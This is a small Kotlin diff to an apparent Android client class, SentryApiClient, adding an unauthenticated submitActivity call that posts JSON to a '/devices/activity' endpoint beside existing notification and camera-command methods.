@@ -77,6 +77,10 @@ class SentryApiClient(
         post("/devices/notifications", body, authenticated = false)
     }
 
+    suspend fun submitActivity(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
+        post("/devices/activity", body, authenticated = false)
+    }
+
     suspend fun pollCameraCommand(): Result<String?> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         val res = request("GET", "/photos/command/$deviceId", null, authenticated = false)
